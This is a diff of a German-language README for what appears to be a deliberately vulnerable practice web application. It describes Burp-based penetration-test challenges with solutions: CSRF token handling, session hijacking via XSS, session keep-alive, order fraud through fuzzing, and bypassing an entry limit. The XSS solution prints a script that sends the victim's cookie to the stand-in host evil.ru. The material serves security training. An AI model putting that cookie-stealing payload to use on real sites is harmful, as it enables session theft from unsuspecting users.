@@ -9,10 +9,10 @@ vorherigen Response (bspw. CSRF tokens). Die empfangenen Daten in einem Teilrequ
 benötigt werden wie zum Beispiel während des Checkout Prozesses. Dies macht den Einsatz von "unique" Namen/IDs während der Erstellung eines Requests notwendig. 
  
 **Randbemerkung**: Das Fuzzing bspw. im Kontext eines CSRF tokens, erzeugt eine Vielzahl von Daten sowie Aufrufe innerhalb der WebApplikation. Dadurch kann im Falle eines Angriffs, die Performance der gesamten Applikation beeinträchtigen. Die Performance selbst,
-steht in diesem Penetration Tests NICHT im Fokus, kann aber je nach gewählter Fuzzing-Methode zu einem "Problem" für den Angriff werden. 
+steht in diesem Penetrationtests NICHT im Fokus, kann aber je nach gewählter Fuzzing-Methode zu einem "Problem" für den Angriff werden. 
 
 ## Problemstellung:
- Helfe der **anna group** durch einen Penetration Test die Sicherheit des Session Handlings zu prüfen. Um diesen Wunsch
+ Helfe der **anna group** durch einen Penetrationtest die Sicherheit des Session Handlings zu prüfen. Um diesen Wunsch
  nachzukommen muss zunächst die Applikation installiert und betriebsbereit gemacht werden. Hierbei hilft 
  sicherlich folgende Anleitung weiter:
  
@@ -33,29 +33,29 @@ steht in diesem Penetration Tests NICHT im Fokus, kann aber je nach gewählter F
 
 #####  [Credentials](https://www.heise.de/security/meldung/hallo-ist-meistgenutztes-deutsches-Passwort-auf-Platz-zehn-steht-ficken-3579567.html): user/hallo 
 
-## Durchführung des Penetration Tests
-Für den Test existiert folgende Use Cases. Zur Durchführung des Penetration Tests kann das File 
+## Durchführung des Penetrationtests
+Für den Test existiert folgende Use Cases. Zur Durchführung des Penetrationtests kann das File 
 "/doc/Burp.burp-projectopts.json" mittels [Burp](https://portswigger.net/burp/freedownload/) als Projekt 
 geladen werden. In der JSON-Datei sind alle "session handling rules" enthalten, um die nachfolgenden Challenges
 zu lösen. Die Challenges können natürlich auch mit anderen Tools wie bspw. OWASP ZAP gelöst werden.
 
 #### Use Case: Bau dir einen eigenen CSRF Token
 ```
-Challenge: Der Übertragene CSRF Token muss übereinstimmen und mit jedem POST Request übertragen werden
+[Challenge]: Der Übertragene CSRF Token muss übereinstimmen und mit jedem POST Request übertragen werden
 
-Lösung:
+[Lösung]:
 * Capture des Requests von einem bestehenden CSRF Token
 * Erstelle eine "Run a Macro" session handling Regel
     * Der Scope liegt auf den Parameter des CSRF Tokens
     * Update den CSRF Token NUR im aktuell gestellten Request
 ```
 
-#### Use Case: Übernehme die Session eines anderen Users mittels Finde eine geeigneten [XSS-Lücke](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
+#### Use Case: Übernehme die Session eines anderen Users mittels [XSS-Lücke](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
 
 ```
-Challenge: Finde ein Eingabefeld, dass eine XSS-Lücke enthält und klaue damit die Session eines ahnungslosen Opfers
+[Challenge]: Finde ein Eingabefeld, dass eine XSS-Lücke enthält und klaue damit die Session eines ahnungslosen Opfers
 
-Lösung:
+[Lösung]:
 * Platziere an einer geeigneten Stelle ein inline JavaScript wie beispielsweise: 
     <script>window.location="http://evil.ru/?cookie=" + document.cookie;</script> 
 * Extrahiere den erbeuteten Cookie aus dem Request und übernehme die Session 
@@ -63,9 +63,9 @@ Lösung:
 
 #### Use Case: Behalte die Login-Session offen
 ```
-Challenge: Mit einer Wahrscheinlichkeit von 5% beenden WebApplikationen die Login-Session
+[Challenge]: Mit einer Wahrscheinlichkeit von 5% beenden WebApplikationen die Login-Session
 
-Lösung:
+[Lösung]:
 * Capture des Login-Requests in einem Makro
 * Erstelle eine "Check Session is Valid" Regel
     * Erstelle einen Request
@@ -76,9 +76,9 @@ Lösung:
     
 #### Use Case: Begehe Bestellbetrug 
 ```
-Challenge: Führe multiple Requests durch bis die finale Bestellbestätigung erscheint
+[Challenge]: Führe multiple Requests durch bis die finale Bestellbestätigung erscheint
 
-Lösung:
+[Lösung]:
 * Führe alle Requests durch bis einer mit Hilfe eines Makros gefuzzed werden kann.
 * Finalisiere den Bestellbetrug mit einem "Run a Post-Request Macro", dass den aktuellen Request zurück gibt
 * Definiere einen engen Definitionsbereich (URL, Parameter)
@@ -86,10 +86,10 @@ Lösung:
 
 #### Use Case: Löschen von Eingefügten Daten
 ```
-Challenge: Aktuell sind nur drei Einträge erlaubt. Um dies etwas gerechter zu machen, soll die "add" 
+[Challenge]: Aktuell sind nur drei Einträge erlaubt. Um dies etwas gerechter zu machen, soll die "add" 
 Funktionalität gefuzzed werden
 
-Lösung:
+[Lösung]:
 * Lösche nachträglich gerade hinzugefügte Notizen 
     * Erstelle ein POST-request Makro, dass die Object ID extrahiert und anschließend den Löschvorgang anstößt.
 ```
